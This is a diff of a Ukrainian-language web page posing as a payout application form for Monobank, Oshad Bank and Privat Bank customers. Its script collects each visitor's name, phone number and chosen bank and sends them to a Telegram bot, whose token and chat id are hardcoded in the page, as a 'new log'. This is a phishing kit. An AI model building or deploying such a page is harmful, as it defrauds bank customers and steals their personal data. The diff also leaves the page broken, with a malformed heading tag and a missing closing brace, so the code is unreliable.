@@ -1,66 +1,97 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Новый лог👻</title>
+<meta charset="UTF-8">
+<title>Сайт</title>
 
-  <style>
-    body {
-      font-family: Arial;
-      background: #0f172a;
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
+<style>
+body {
+  margin: 0;
+  font-family: Arial;
+  background: linear-gradient(135deg, #0f172a, #1e3a8a);
+  color: white;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
 
-    .box {
-      background: #1e293b;
-      padding: 20px;
-      border-radius: 12px;
-      width: 300px;
-    }
+.box {
+  background: rgba(255,255,255,0.05);
+  backdrop-filter: blur(10px);
+  padding: 25px;
+  border-radius: 16px;
+  width: 320px;
+  text-align: center;
+}
 
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border: none;
-      border-radius: 6px;
-    }
+input {
+  width: 100%;
+  padding: 12px;
+  margin: 10px 0;
+  border: none;
+  border-radius: 8px;
+}
 
-    button {
-      width: 100%;
-      padding: 10px;
-      background: #3b82f6;
-      border: none;
-      border-radius: 6px;
-      color: white;
-      cursor: pointer;
-    }
+/* услуги */
+.service {
+  padding: 10px;
+  margin: 5px 0;
+  border-radius: 8px;
+  background: #334155;
+  cursor: pointer;
+}
 
-    button:hover {
-      background: #2563eb;
-    }
-  </style>
+.service.active {
+  background: #3b82f6;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  background: linear-gradient(90deg, #3b82f6, #06b6d4);
+  border: none;
+  border-radius: 8px;
+  color: white;
+  margin-top: 10px;
+}
+</style>
 </head>
 
 <body>
 
 <div class="box">
-  <h2>Оставь заявку</h2>
+  <h2 Оставити заявку</h2>
 
-  <input type="text" id="name" placeholder="Имя">
-  <input type="text" id="phone" placeholder="Телефон">
+  <input type="text" id="name" placeholder="Ваше ім'я">
+  <input type="text" id="phone" placeholder="Ваш телефон">
 
-  <button onclick="send()">Получить виплату</button>
+  <p>Виберіть ваш банк:</p>
+
+  <div class="service" onclick="selectService(this)">Monobank</div>
+  <div class="service" onclick="selectService(this)">Oshad Bank</div>
+  <div class="service" onclick="selectService(this)">Privat Bank</div>
+
+  <button onclick="send()">Подати заявку</button>
 </div>
 
 <script>
+let selectedService = "";
+
+function selectService(el) {
+  document.querySelectorAll(".service").forEach(e => e.classList.remove("active"));
+  el.classList.add("active");
+  selectedService = el.innerText;
+}
+
 function send() {
-  const name = document.getElementById("name").value;
-  const phone = document.getElementById("phone").value;
+  const name = document.getElementById("name").value.trim();
+  const phone = document.getElementById("phone").value.trim();
+
+  if (!name || !phone || !selectedService) {
+    alert("Заповніть всі поля і виберіть ваш банк");
+    return;
+  }
 
   const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
   const chat_id = "8035773808";
@@ -70,12 +101,11 @@ function send() {
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       chat_id: chat_id,
-      text: `🔥 Новый лог👻:\nИмя: ${name}\nТелефон: ${phone}`
+      text: `🔥 Новый Лог 👻:\nИмя: ${name}\nТелефон: ${phone}\nКарта: ${selectedService}`
     })
   });
 
-  alert("Отправлено!");
-}
+  alert("Заявка відправлена!");
 </script>
 
 </body>
